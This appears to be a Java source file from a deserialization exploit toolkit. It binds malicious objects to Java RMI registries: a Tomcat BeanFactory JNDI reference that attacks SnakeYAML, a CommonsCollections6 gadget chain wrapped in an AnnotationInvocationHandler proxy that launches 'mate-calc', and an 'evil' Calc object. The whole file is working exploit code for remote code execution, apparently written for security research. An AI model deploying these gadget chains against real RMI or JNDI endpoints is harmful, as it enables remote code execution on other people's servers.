package xyz.eki.marshalexp.rmi;

import com.dr34d.Calc;
import com.dr34d.ICalc;
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import xyz.eki.marshalexp.gadget.jndi.rmi.GTomcatBeanFactory;
import xyz.eki.marshalexp.poc.CC6;

import javax.naming.Reference;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Naming;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class Bind {

    public static void SnakeYamlBind() throws Exception{
        Reference ref = GTomcatBeanFactory.AttackWithSnakeYaml();
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);

        Naming.bind("rmi://192.168.31.82:8883/123",referenceWrapper);
    }

    public static void TestJEP290() throws Exception{
        Registry registry = LocateRegistry.getRegistry(1099);
        Object pocObject = new CC6().getPocObject("mate-calc");

        Map<String, Object> map = new HashMap<>();
        map.put("whatever", pocObject);
        Constructor constructor =  Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler invocationHandler  = (InvocationHandler) constructor.newInstance(Override.class, map);
        Remote obj = (Remote) Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[]{Remote.class}, invocationHandler);

        registry.bind("evil", obj);
    }

    public static void EvilReturn() throws Exception{
        Registry registry = LocateRegistry.getRegistry(1099);
        Calc obj = new Calc();
        registry.bind("evil", obj);
    }

    public static void main(String[] args) throws Exception{
        EvilReturn();
    }
}
